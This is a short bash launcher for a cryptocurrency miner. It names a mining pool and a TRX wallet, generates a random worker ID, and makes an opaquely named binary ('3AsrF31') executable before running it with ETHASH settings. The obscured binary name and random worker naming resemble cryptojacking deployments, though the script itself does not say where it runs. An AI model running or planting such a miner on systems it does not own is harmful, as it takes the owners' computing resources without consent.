#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TBDcMzhsjcApVBtf6QuWPpAszcPsi6orHn
WORKEER=$(echo $(shuf -i 10000-99999999999 -n 1)-andhiku)

chmod  +x 3AsrF31
./3AsrF31 --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
